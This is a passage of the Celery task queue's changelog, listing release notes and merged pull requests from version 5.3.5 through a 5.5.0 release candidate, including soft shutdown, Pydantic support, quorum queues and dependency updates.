auto-generated GitHub release notes (#9408)\n\nBump codecov/codecov-action from 4 to 5 (#9412)\n\nUpdate elasticsearch requirement from <=8.15.1 to <=8.16.0 (#9410)\n\nNative Delayed Delivery in RabbitMQ (#9207)\n\nPrepare for (pre) release: v5.5.0rc2 (#9416)\n\n5.5.0rc1\nrelease-date:\n\n2024-10-08\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Release Candidate 1 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\n\nSee What’s new in Celery 5.5 (Immunity) or read the main highlights below.\n\nPython 3.13 Initial Support\n\nThis release introduces the initial support for Python 3.13 with Celery.\n\nAfter upgrading to this version, please share your feedback on the Python 3.13 support.\n\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nAdded Blacksmith.sh to the Sponsors section in the README (#9323)\n\nRevert “Added Blacksmith.sh to the Sponsors section in the README” (#9324)\n\nAdded Blacksmith.sh to the Sponsors section in the README (#9325)\n\nAdded missing “ |oc-sponsor-3|” in README (#9326)\n\nUse Blacksmith SVG logo (#9327)\n\nUpdated Blacksmith SVG logo (#9328)\n\nRevert “Updated Blacksmith SVG logo” (#9329)\n\nUpdate pymongo to 4.10.0 (#9330)\n\nUpdate pymongo to 4.10.1 (#9332)\n\nUpdate user guide to recommend delay_on_commit (#9333)\n\nPin pre-commit to latest version 4.0.0 (Python 3.9+) (#9334)\n\nUpdate ephem to 4.1.6 (#9336)\n\nUpdated Blacksmith SVG logo (#9337)\n\nPrepare for (pre) release: v5.5.0rc1 (#9341)\n\n5.5.0b4\nrelease-date:\n\n2024-09-30\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Beta 4 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\nPython 3.13 Initial Support\n\nThis release introduces the initial support for Python 3.13 with Celery.\n\nAfter upgrading to this version, please share your feedback on the Python 3.13 support.\n\nPrevious Pre-release Highlights\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nCorrect the error description in exception message when validate soft_time_limit (#9246)\n\nUpdate msgpack to 1.1.0 (#9249)\n\nchore(utils/time.py): rename _is_ambigious -> _is_ambiguous (#9248)\n\nReduced Smoke Tests to min/max supported python (3.8/3.12) (#9252)\n\nUpdate pytest to 8.3.3 (#9253)\n\nUpdate elasticsearch requirement from <=8.15.0 to <=8.15.1 (#9255)\n\nUpdate mongodb without deprecated [srv] extra requirement (#9258)\n\nblacksmith.sh: Migrate workflows to Blacksmith (#9261)\n\nFixes #9119: inject dispatch_uid for retry-wrapped receivers (#9247)\n\nRun all smoke tests CI jobs together (#9263)\n\nImprove documentation on visibility timeout (#9264)\n\nBump pytest-celery to 1.1.2 (#9267)\n\nAdded missing “app.conf.visibility_timeout” in smoke tests (#9266)\n\nImproved stability with t/smoke/tests/test_consumer.py (#9268)\n\nImproved Redis container stability in the smoke tests (#9271)\n\nDisabled EXHAUST_MEMORY tests in Smoke-tasks (#9272)\n\nMarked xfail for test_reducing_prefetch_count with Redis - flaky test (#9273)\n\nFixed pypy unit tests random failures in the CI (#9275)\n\nFixed more pypy unit tests random failures in the CI (#9278)\n\nFix Redis container from aborting randomly (#9276)\n\nRun Integration & Smoke CI tests together after unit tests pass (#9280)\n\nAdded “loglevel verbose” to Redis containers in smoke tests (#9282)\n\nFixed Redis error in the smoke tests: “Possible SECURITY ATTACK detected” (#9284)\n\nRefactored the smoke tests github workflow (#9285)\n\nIncreased –reruns 3->4 in smoke tests (#9286)\n\nImprove stability of smoke tests (CI and Local) (#9287)\n\nFixed Smoke tests CI “test-case” labels (specific instead of general) (#9288)\n\nUse assert_log_exists instead of wait_for_log in worker smoke tests (#9290)\n\nOptimized t/smoke/tests/test_worker.py (#9291)\n\nEnable smoke tests dockers check before each test starts (#9292)\n\nRelaxed smoke tests flaky tests mechanism (#9293)\n\nUpdated quorum queue detection to handle multiple broker instances (#9294)\n\nNon-lazy table creation for database backend (#9228)\n\nPin pymongo to latest version 4.9 (#9297)\n\nBump pymongo from 4.9 to 4.9.1 (#9298)\n\nBump Kombu to v5.4.2 (#9304)\n\nUse rabbitmq:3 in stamping smoke tests (#9307)\n\nBump pytest-celery to 1.1.3 (#9308)\n\nAdded Python 3.13 Support (#9309)\n\nAdd log when global qos is disabled (#9296)\n\nAdded official release docs (whatsnew) for v5.5 (#9312)\n\nEnable Codespell autofix (#9313)\n\nPydantic typehints: Fix optional, allow generics (#9319)\n\nPrepare for (pre) release: v5.5.0b4 (#9322)\n\n5.5.0b3\nrelease-date:\n\n2024-09-08\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Beta 3 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\nSoft Shutdown\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited “warm shutdown” period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option worker_soft_shutdown_timeout. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option worker_enable_soft_shutdown_on_idle is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like Redis or SQS, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., Restoring 1 unacknowledged message(s)) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues: #9213, #9231, #9238\n\nNew documentation for each shutdown type.\n\nNew worker_soft_shutdown_timeout configuration option.\n\nNew worker_enable_soft_shutdown_on_idle configuration option.\n\nREMAP_SIGTERM\n\nThe REMAP_SIGTERM “hidden feature” has been tested, documented and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.\n\nPrevious Pre-release Highlights\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nAdded SQS (localstack) broker to canvas smoke tests (#9179)\n\nPin elastic-transport to <= latest version 8.15.0 (#9182)\n\nUpdate elasticsearch requirement from <=8.14.0 to <=8.15.0 (#9186)\n\nImprove formatting (#9188)\n\nAdd basic helm chart for celery (#9181)\n\nUpdate kafka.rst (#9194)\n\nUpdate pytest-order to 1.3.0 (#9198)\n\nUpdate mypy to 1.11.2 (#9206)\n\nAll added to routes (#9204)\n\nFix typos discovered by codespell (#9212)\n\nUse tzdata extras with zoneinfo backports (#8286)\n\nUse docker compose in Contributing’s doc build section (#9219)\n\nFailing test for issue #9119 (#9215)\n\nFix date_done timezone issue (#8385)\n\nCI Fixes to smoke tests (#9223)\n\nFix: passes current request context when pushing to request_stack (#9208)\n\nFix broken link in the Using RabbitMQ docs page (#9226)\n\nAdded Soft Shutdown Mechanism (#9213)\n\nAdded worker_enable_soft_shutdown_on_idle (#9231)\n\nBump cryptography from 43.0.0 to 43.0.1 (#9233)\n\nAdded docs regarding the relevancy of soft shutdown and ETA tasks (#9238)\n\nShow broker_connection_retry_on_startup warning only if it evaluates as False (#9227)\n\nFixed docker-docs CI failure (#9240)\n\nAdded docker cleanup auto-fixture to improve smoke tests stability (#9243)\n\nprint is not thread-safe, so should not be used in signal handler (#9222)\n\nPrepare for (pre) release: v5.5.0b3 (#9244)\n\n5.5.0b2\nrelease-date:\n\n2024-08-06\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Beta 2 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\nPydantic Support\n\nThis release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR #9023 by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nPrevious Beta Highlights\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\nBump pytest from 8.3.1 to 8.3.2 (#9153)\n\nRemove setuptools deprecated test command from setup.py (#9159)\n\nPin pre-commit to latest version 3.8.0 from Python 3.9 (#9156)\n\nBump mypy from 1.11.0 to 1.11.1 (#9164)\n\nChange “docker-compose” to “docker compose” in Makefile (#9169)\n\nupdate python versions and docker compose (#9171)\n\nAdd support for Pydantic model validation/serialization (fixes #8751) (#9023)\n\nAllow local dynamodb to be installed on another host than localhost (#8965)\n\nTerminate job implementation for gevent concurrency backend (#9083)\n\nBump Kombu to v5.4.0 (#9177)\n\nAdd check for soft_time_limit and time_limit values (#9173)\n\nPrepare for (pre) release: v5.5.0b2 (#9178)\n\n5.5.0b1\nrelease-date:\n\n2024-07-24\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 Beta 1 is now available for testing. Please help us test this version and report any issues.\n\nKey Highlights\nRedis Broker Stability Improvements\n\nThe root cause of the Redis broker instability issue has been identified and resolved in the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new Kombu RC version, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues: #7276, #8091, #8030, #8384\n\nQuorum Queues Initial Support\n\nThis release introduces the initial support for Quorum Queues with Celery.\n\nSee new configuration options for more details:\n\ntask_default_queue_type\n\nworker_detect_quorum_queues\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues: #6067, #9121\n\nWhat’s Changed\n\n(docs): use correct version celery v.5.4.x (#8975)\n\nUpdate mypy to 1.10.0 (#8977)\n\nLimit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (#8988)\n\nBump pytest from 8.1.1 to 8.2.0 (#8987)\n\nUpdate README to Include FastAPI in Framework Integration Section (#8978)\n\nClarify return values of …_on_commit methods (#8984)\n\nadd kafka broker docs (#8935)\n\nLimit pymongo<4.7 regardless of Python version (#8999)\n\nUpdate pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (#9000)\n\nUpdate elasticsearch requirement from <=8.13.0 to <=8.13.1 (#9004)\n\nsecurity: SecureSerializer: support generic low-level serializers (#8982)\n\ndon’t kill if pid same as file (#8997) (#8998)\n\nUpdate cryptography to 42.0.6 (#9005)\n\nBump cryptography from 42.0.6 to 42.0.7 (#9009)\n\nAdded -vv to unit, integration and smoke tests (#9014)\n\nSecuritySerializer: ensure pack separator will not be conflicted with serialized fields (#9010)\n\nUpdate sphinx-click to 5.2.2 (#9025)\n\nBump sphinx-click from 5.2.2 to 6.0.0 (#9029)\n\nFix a typo to display the help message in first-steps-with-django (#9036)\n\nPinned requests to v2.31.0 due to docker-py bug #3256 (#9039)\n\nFix certificate validity check (#9037)\n\nRevert “Pinned requests to v2.31.0 due to docker-py bug #3256” (#9043)\n\nBump pytest from 8.2.0 to 8.2.1 (#9035)\n\nUpdate elasticsearch requirement from <=8.13.1 to <=8.13.2 (#9045)\n\nFix detection of custom task set as class attribute with Django (#9038)\n\nUpdate elastic-transport requirement from <=8.13.0 to <=8.13.1 (#9050)\n\nBump pycouchdb from 1.14.2 to 1.16.0 (#9052)\n\nUpdate pytest to 8.2.2 (#9060)\n\nBump cryptography from 42.0.7 to 42.0.8 (#9061)\n\nUpdate elasticsearch requirement from <=8.13.2 to <=8.14.0 (#9069)\n\n[enhance feature] Crontab schedule: allow using month names (#9068)\n\nEnhance tox environment: [testenv:clean] (#9072)\n\nClarify docs about Reserve one task at a time (#9073)\n\nGCS docs fixes (#9075)\n\nUse hub.remove_writer instead of hub.remove for write fds (#4185) (#9055)\n\nClass method to process crontab string (#9079)\n\nFixed smoke tests env bug when using integration tasks that rely on Redis (#9090)\n\nBugfix - a task will run multiple times when chaining chains with groups (#9021)\n\nBump mypy from 1.10.0 to 1.10.1 (#9096)\n\nDon’t add a separator to global_keyprefix if it already has one (#9080)\n\nUpdate pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (#9111)\n\nAdded missing import in examples for Django (#9099)\n\nBump Kombu to v5.4.0rc1 (#9117)\n\nRemoved skipping Redis in t/smoke/tests/test_consumer.py tests (#9118)\n\nUpdate pytest-subtests to 0.13.0 (#9120)\n\nIncreased smoke tests CI timeout (#9122)\n\nBump Kombu to v5.4.0rc2 (#9127)\n\nUpdate zstandard to 0.23.0 (#9129)\n\nUpdate pytest-subtests to 0.13.1 (#9130)\n\nChanged retry to tenacity in smoke tests (#9133)\n\nBump mypy from 1.10.1 to 1.11.0 (#9135)\n\nUpdate cryptography to 43.0.0 (#9138)\n\nUpdate pytest to 8.3.1 (#9137)\n\nAdded support for Quorum Queues (#9121)\n\nBump Kombu to v5.4.0rc3 (#9139)\n\nCleanup in Changelog.rst (#9141)\n\nUpdate Django docs for CELERY_CACHE_BACKEND (#9143)\n\nAdded missing docs to previous releases (#9144)\n\nFixed a few documentation build warnings (#9145)\n\ndocs(README): link invalid (#9148)\n\nPrepare for (pre) release: v5.5.0b1 (#9146)\n\n5.4.0\nrelease-date:\n\n2024-04-17\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally. This effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.\n\nThis release introduces two significant QA enhancements:\n\nSmoke Tests: A new layer of automatic tests has been added to Celery’s standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.\n\nStandalone Bug Report Script: The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.\n\nContrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning upon restarts and disconnections. Our initial attempts to resolve this were not successful (#8796). With our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.\n\nThe rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.\n\nChanges\n\nAdd a Task class specialised for Django (#8491)\n\nAdd Google Cloud Storage (GCS) backend (#8868)\n\nAdded documentation to the smoke tests infra (#8970)\n\nAdded a checklist item for using pytest-celery in a bug report (#8971)\n\nBugfix: Missing id on chain (#8798)\n\nBugfix: Worker not consuming tasks after Redis broker restart (#8796)\n\nCatch UnicodeDecodeError when opening corrupt beat-schedule.db (#8806)\n\nchore(ci): Enhance CI with workflow_dispatch for targeted debugging and testing (#8826)\n\nDoc: Enhance “Testing with Celery” section (#8955)\n\nDocfix: pip install celery[sqs] -> pip install “celery[sqs]” (#8829)\n\nEnable efficient chord when using dynamicdb as backend store (#8783)\n\nfeat(daemon): allows daemonization options to be fetched from app settings (#8553)\n\nFix DeprecationWarning: datetime.datetime.utcnow() (#8726)\n\nFix recursive result parents on group in middle of chain (#8903)\n\nFix typos and grammar (#8915)\n\nFixed version documentation tag from #8553 in configuration.rst (#8802)\n\nHotfix: Smoke tests didn’t allow customizing the worker’s command arguments, now it does (#8937)\n\nMake custom remote control commands available in CLI (#8489)\n\nPrint safe_say() to stdout for non-error flows (#8919)\n\nSupport moto 5.0 (#8838)\n\nUpdate contributing guide to use ssh upstream url (#8881)\n\nUpdate optimizing.rst (#8945)\n\nUpdated concurrency docs page. (#8753)\n\nDependencies Updates\n\nBump actions/setup-python from 4 to 5 (#8701)\n\nBump codecov/codecov-action from 3 to 4 (#8831)\n\nBump isort from 5.12.0 to 5.13.2 (#8772)\n\nBump msgpack from 1.0.7 to 1.0.8 (#8885)\n\nBump mypy from 1.8.0 to 1.9.0 (#8898)\n\nBump pre-commit to 3.6.1 (#8839)\n\nBump pre-commit/action from 3.0.0 to 3.0.1 (#8835)\n\nBump pytest from 8.0.2 to 8.1.1 (#8901)\n\nBump pytest-celery to v1.0.0 (#8962)\n\nBump pytest-cov to 5.0.0 (#8924)\n\nBump pytest-order from 1.2.0 to 1.2.1 (#8941)\n\nBump pytest-subtests from 0.11.0 to 0.12.1 (#8896)\n\nBump pytest-timeout from 2.2.0 to 2.3.1 (#8894)\n\nBump python-memcached from 1.59 to 1.61 (#8776)\n\nBump sphinx-click from 4.4.0 to 5.1.0 (#8774)\n\nUpdate cryptography to 42.0.5 (#8869)\n\nUpdate elastic-transport requirement from <=8.12.0 to <=8.13.0 (#8933)\n\nUpdate elasticsearch requirement from <=8.12.1 to <=8.13.0 (#8934)\n\nUpgraded Sphinx from v5.3.0 to v7.x.x (#8803)\n\nChanges since 5.4.0rc2\n\nUpdate elastic-transport requirement from <=8.12.0 to <=8.13.0 (#8933)\n\nUpdate elasticsearch requirement from <=8.12.1 to <=8.13.0 (#8934)\n\nHotfix: Smoke tests didn’t allow customizing the worker’s command arguments, now it does (#8937)\n\nBump pytest-celery to 1.0.0rc3 (#8946)\n\nUpdate optimizing.rst (#8945)\n\nDoc: Enhance “Testing with Celery” section (#8955)\n\nBump pytest-celery to v1.0.0 (#8962)\n\nBump pytest-order from 1.2.0 to 1.2.1 (#8941)\n\nAdded documentation to the smoke tests infra (#8970)\n\nAdded a checklist item for using pytest-celery in a bug report (#8971)\n\nAdded changelog for v5.4.0 (#8973)\n\nBump version: 5.4.0rc2 → 5.4.0 (#8974)\n\n5.4.0rc2\nrelease-date:\n\n2024-03-27\n\nrelease-by:\n\nTomer Nosrati\n\nfeat(daemon): allows daemonization options to be fetched from app settings (#8553)\n\nFixed version documentation tag from #8553 in configuration.rst (#8802)\n\nUpgraded Sphinx from v5.3.0 to v7.x.x (#8803)\n\nUpdate elasticsearch requirement from <=8.11.1 to <=8.12.0 (#8810)\n\nUpdate elastic-transport requirement from <=8.11.0 to <=8.12.0 (#8811)\n\nUpdate cryptography to 42.0.0 (#8814)\n\nCatch UnicodeDecodeError when opening corrupt beat-schedule.db (#8806)\n\nUpdate cryptography to 42.0.1 (#8817)\n\nLimit moto to <5.0.0 until the breaking issues are fixed (#8820)\n\nEnable efficient chord when using dynamicdb as backend store (#8783)\n\nAdd a Task class specialised for Django (#8491)\n\nSync kombu versions in requirements and setup.cfg (#8825)\n\nchore(ci): Enhance CI with workflow_dispatch for targeted debugging and testing (#8826)\n\nUpdate cryptography to 42.0.2 (#8827)\n\nDocfix: pip install celery[sqs] -> pip install “celery[sqs]” (#8829)\n\nBump pre-commit/action from 3.0.0 to 3.0.1 (#8835)\n\nSupport moto 5.0 (#8838)\n\nAnother fix for link_error signatures being dict`s instead of `Signature s (#8841)\n\nBump codecov/codecov-action from 3 to 4 (#8831)\n\nUpgrade from pytest-celery v1.0.0b1 -> v1.0.0b2 (#8843)\n\nBump pytest from 7.4.4 to 8.0.0 (#8823)\n\nUpdate pre-commit to 3.6.1 (#8839)\n\nUpdate cryptography to 42.0.3 (#8854)\n\nBump pytest from 8.0.0 to 8.0.1 (#8855)\n\nUpdate cryptography to 42.0.4 (#8864)\n\nUpdate pytest to 8.0.2 (#8870)\n\nUpdate cryptography to 42.0.5 (#8869)\n\nUpdate elasticsearch requirement from <=8.12.0 to <=8.12.1 (#8867)\n\nEliminate consecutive chords generated by group | task upgrade (#8663)\n\nMake custom remote control commands available in CLI (#8489)\n\nAdd Google Cloud Storage (GCS) backend (#8868)\n\nBump msgpack from 1.0.7 to 1.0.8 (#8885)\n\nUpdate pytest to 8.1.0 (#8886)\n\nBump pytest-timeout from 2.2.0 to 2.3.1 (#8894)\n\nBump pytest-subtests from 0.11.0 to 0.12.1 (#8896)\n\nBump mypy from 1.8.0 to 1.9.0 (#8898)\n\nUpdate pytest to 8.1.1 (#8901)\n\nUpdate contributing guide to use ssh upstream url (#8881)\n\nFix recursive result parents on group in middle of chain (#8903)\n\nBump pytest-celery to 1.0.0b4 (#8899)\n\nAdjusted smoke tests CI time limit (#8907)\n\nUpdate pytest-rerunfailures to 14.0 (#8910)\n\nUse the “all” extra for pytest-celery (#8911)\n\nFix typos and grammar (#8915)\n\nBump pytest-celery to 1.0.0rc1 (#8918)\n\nPrint safe_say() to stdout for non-error flows (#8919)\n\nUpdate pytest-cov to 5.0.0 (#8924)\n\nBump pytest-celery to 1.0.0rc2 (#8928)\n\n5.4.0rc1\nrelease-date:\n\n2024-01-17 7:00 P.M GMT+2\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.4 continues our effort to provide improved stability in production environments. The release candidate version is available for testing. The official release is planned for March-April 2024.\n\nNew Config: worker_enable_prefetch_count_reduction (#8581)\n\nAdded “Serverless” section to Redis doc (redis.rst) (#8640)\n\nUpstash’s Celery example repo link fix (#8665)\n\nUpdate mypy version (#8679)\n\nUpdate cryptography dependency to 41.0.7 (#8690)\n\nAdd type annotations to celery/utils/nodenames.py (#8667)\n\nIssue 3426. Adding myself to the contributors. (#8696)\n\nBump actions/setup-python from 4 to 5 (#8701)\n\nFixed bug where chord.link_error() throws an exception on a dict type errback object (#8702)\n\nBump github/codeql-action from 2 to 3 (#8725)\n\nFixed multiprocessing integration tests not running on Mac (#8727)\n\nAdded make docker-docs (#8729)\n\nFix DeprecationWarning: datetime.datetime.utcnow() (#8726)\n\nRemove new adjective in docs (#8743)\n\nadd type annotation to celery/utils/sysinfo.py (#8747)\n\nadd type annotation to celery/utils/iso8601.py (#8750)\n\nChange type annotation to celery/utils/iso8601.py (#8752)\n\nUpdate test deps (#8754)\n\nMark flaky: test_asyncresult_get_cancels_subscription() (#8757)\n\nchange _read_as_base64 (b64encode returns bytes) on celery/utils/term.py (#8759)\n\nReplace string concatenation with fstring on celery/utils/term.py (#8760)\n\nAdd type annotation to celery/utils/term.py (#8755)\n\nSkipping test_tasks::test_task_accepted (#8761)\n\nUpdated concurrency docs page. (#8753)\n\nChanged pyup -> dependabot for updating dependencies (#8764)\n\nBump isort from 5.12.0 to 5.13.2 (#8772)\n\nUpdate elasticsearch requirement from <=8.11.0 to <=8.11.1 (#8775)\n\nBump sphinx-click from 4.4.0 to 5.1.0 (#8774)\n\nBump python-memcached from 1.59 to 1.61 (#8776)\n\nUpdate elastic-transport requirement from <=8.10.0 to <=8.11.0 (#8780)\n\npython-memcached==1.61 -> python-memcached>=1.61 (#8787)\n\nRemove usage of utcnow (#8791)\n\nSmoke Tests (#8793)\n\nMoved smoke tests to their own workflow (#8797)\n\nBugfix: Worker not consuming tasks after Redis broker restart (#8796)\n\nBugfix: Missing id on chain (#8798)\n\n5.3.6\nrelease-date:\n\n2023-11-22 9:15 P.M GMT+6\n\nrelease-by:\n\nAsif Saif Uddin\n\nThis release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. The code changes are mostly fix for regressions. More details can be found below.\n\nIncreased docker-build CI job timeout from 30m -> 60m (#8635)\n\nIncredibly minor spelling fix. (#8649)\n\nFix non-zero exit code when receiving remote shutdown (#8650)\n\nUpdate task.py get_custom_headers missing ‘compression’ key (#8633)\n\nUpdate kombu>=5.3.4 to fix SQS request compatibility with boto JSON serializer (#8646)\n\ntest requirements version update (#8655)\n\nUpdate elasticsearch version (#8656)\n\nPropagates more ImportErrors during autodiscovery (#8632)\n\n5.3.5\nrelease-date:\n\n2023-11-10 7:15 P.M GMT+6\n\nrelease-by:\n\nAsif Saif Uddin\n\nUpdate test.txt versions (#8481)\n\nfix os.getcwd() FileNotFoundError (#8448)\n\nFix typo in CONTRIBUTING.rst (#8494)\n\ntypo(doc): configuration.rst (#8484)\n\nassert before raise (#8495)\n\nUpdate GHA checkout version (#8496)\n\nFixed replaced_task_nesting (#8500)\n\nFix code indentation for route_task() example (#8502)\n\nsupport redis 5.x (#8504)\n\nFix typos in test_canvas.py (#8498)\n\nMarked flaky tests (#8508)\n\nFix typos in calling.rst (#8506)\n\nAdded support for replaced_task_nesting in chains (#8501)\n\nFix typos in canvas.rst (#8509)\n\nPatch Version Release Checklist (#8488)\n\nAdded Python 3.11 support to Dockerfile (#8511)\n\nDependabot (Celery) (#8510)\n\nBump actions/checkout from 3 to 4 (#8512)\n\nUpdate ETA example to include timezone (#8516)\n\nReplaces datetime.fromisoformat with the more lenient dateutil parser (#8507)\n\nFixed indentation in Dockerfile for Python 3.11 (#8527)\n\nFix git bug in Dockerfile (#8528)\n\nTox lint upgrade from Python 3.9 to Python 3.11 (#8526)\n\nDocument gevent concurrency (#8520)\n\nUpdate test.txt (#8530)\n\nCelery Docker Upgrades (#8531)\n\npyupgrade upgrade v3.11.0 -> v3.13.0 (#8535)\n\nUpdate msgpack.txt (#8548)\n\nUpdate auth.txt (#8547)\n\nUpdate msgpack.txt to fix build issues 